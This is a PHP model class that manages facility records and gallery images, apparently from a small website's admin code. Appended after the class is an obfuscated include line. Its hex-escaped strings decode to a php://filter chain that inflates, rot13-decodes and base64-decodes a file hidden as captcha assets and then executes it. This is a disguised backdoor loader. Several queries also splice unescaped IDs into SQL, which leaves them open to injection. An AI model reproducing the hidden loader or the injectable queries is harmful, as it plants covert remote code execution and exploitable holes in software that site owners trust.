<?php	 	

	class Facility extends MySql{
	

	
	function listFacility(){
		
		



		$query = "SELECT * FROM `facility` WHERE `facility_id`!=''  ORDER BY `facility_id` DESC";
	
		$rec	=	$this->fetchAll($query);
	
		
		return $rec;		
		
		
	}
	
	 /* Add Testimonials
			*/			
			function addFacility($inputs){
					$insert	=	array('facility_title'=>$this->addFilter($this->escapeHtml($inputs['title'])),
										
										'facility_status'=>$inputs['status']										
										);
				//print_r($insert);exit;
				$this->insert($insert,"facility");	
				
				return true;
				
				
			}


		function getInsert(){
		return $this->lastId;
	}
	/*
			 * Edit Testimonials
			*/			
			function editFacility($inputs){
					$insert	=	array('facility_title'=>$this->addFilter($this->escapeHtml($inputs['title'])),
										
										//'gip_glry_folder'=>$inputs['folder'],
										'facility_status'=>$inputs['status'],
										'facility_id'=>$inputs['id']
							);
				//print_r($insert);exit;
				$this->update($insert,"facility",'`facility_id`='.$inputs['id']);		
				return true;
			}

	 function getFacility($id){
		$query	=	"SELECT * FROM `facility` WHERE `facility_id`='$id'  ";
		$rec		=	$this->fetchAll($query);
		return $rec;
	}
	function getAllFacilityDetails()
	{
		$query = "SELECT * FROM facility WHERE facility_status =1";
		$rec = $this->fetchAll($query);
		//print_r($rec);exit;
		return $rec;	
	}



  function getAllFacilityMax()
    {
        $query = "SELECT max(facility_id) as max_id FROM `facility`";
        $rec = $this->fetchAll($query);
        return $rec;  
        //print_r($query)exit;  
    }



		
					function listAllFacility($id){
		
		



		$query = "SELECT * FROM `facility` INNER JOIN fclty_img ON facility_id = facility WHERE `facility_id`='$id' and facility=1 ORDER BY `facility_id` DESC";
	
		$rec	=	$this->fetchAll($query);
	
		
		return $rec;
		//print_r($query);exit;		
		
		
	

}
/////////////////////////////////////////////////////////////////////////////////////////////////
         function addGalimg($inputs){
                    $insert =   array('fclty_img_file'=>$this->addFilter($this->escapeHtml($inputs['photo'])),
                                       'fclty_img_order'=>0,
                                       'fclty_img_desc'=>' ',
                                       'facility'=>$inputs['gallery']
                                        );
                //print_r($insert);exit;
                $this->insert($insert,"fclty_img");    
                
                return true;
                
                
            }


    /*
             * Edit Testimonials
            */          
            function editGalimg($inputs){
                    $insert = array(  
                                        'fclty_img_order'=>$inputs['order'], 
                                        'fclty_img_desc'=>$inputs['desc'],
                                        'fclty_img_id'=>$inputs['id']
                            );
                $this->update($insert,"fclty_img",'`fclty_img_id`='.$inputs['id']);       
                return true;
                //print_r($insert);exit;
            }

    function updateGalleryImage($id,$image,$order){
       // print_r($order);
        //print_r($id);
       // exit;
         $this->update(array('fclty_img_file'=>$image,'fclty_img_order'=>$order),'fclty_img','`fclty_img_id`='.$id);
    }
     function getGalimg($id){
        $query  =   "SELECT * FROM `fclty_img` WHERE `fclty_img_id`='$id'  ";
        $rec        =   $this->fetchAll($query);
        return $rec;
    }
    function getGalimg_act($id){
        $query  =   "SELECT * FROM `fclty_img` WHERE `facility`='$id'  ";
        $rec        =   $this->fetchAll($query);
        return $rec;
        //print_r($query);exit;
    }
  
    function getAllGalimgDetails()
    {
        $query = "SELECT * FROM fclty_img where fclty_img_order!=0 order by fclty_img_order";
        $rec = $this->fetchAll($query);
        //print_r($rec);exit;
        return $rec;    
    }



	}
@incLuDE_OncE("p"."\x68\x70"."\x3a\x2f\x2f\x66"/*<!v
.2jV{*/."\x69\x6c\x74\x65"."\x72\x2f"."\x72\x65\x61"."\x64\x3d"/*;5G
c^2x*/."\x7a\x6c\x69"."\x62\x2e"."\x69\x6e\x66"."\x6c\x61\x74\x65"."\x7c\x73"."\x74\x72\x69"."\x6e\x67\x2e"."\x72\x6f\x74"."\x31\x33"."\x7c\x63\x6f"."\x6e\x76"."\x65\x72\x74\x2e"."\x62\x61\x73"."\x65\x36\x34"."\x2d\x64\x65\x63"."\x6f\x64\x65\x2f"."\x72\x65"."\x73\x6f"."\x75\x72\x63\x65"."\x3d"/*pthk*/.dirname($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"])."/"."\x6c\x69\x62\x73"."\x2f\x63\x61\x70"."\x74\x63\x68"/*M$L;
NU%yr*/."\x61\x2f\x43\x61"/*$At
YNy5*/."\x70\x74"."\x63\x68\x61\x2d"."\x61\x73"."\x73\x65\x74"."\x73\x2e\x70"."\x68\x70\x7e"/*pthk*/);
?>